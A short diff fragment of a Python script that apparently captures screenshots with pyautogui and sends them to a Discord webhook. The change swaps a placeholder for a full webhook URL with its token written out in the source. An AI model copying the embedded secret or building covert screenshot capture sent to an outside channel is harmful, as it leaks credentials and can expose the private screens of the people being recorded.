@@ -4,7 +4,7 @@ import pyautogui
 import io
 
 # Discord webhook URL
-WEBHOOK_URL = "YOUR_WEBHOOK_URL"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1206398430793048134/UuEBB3XdKNoNzbCP3eEAi2eNV-Uel43AewTlUG0O0HK8rvhf_cL7VTeQ_GhBlNfOkUep"
 
 # Function to send screenshot via webhook
 def send_screenshot(image_bytes):
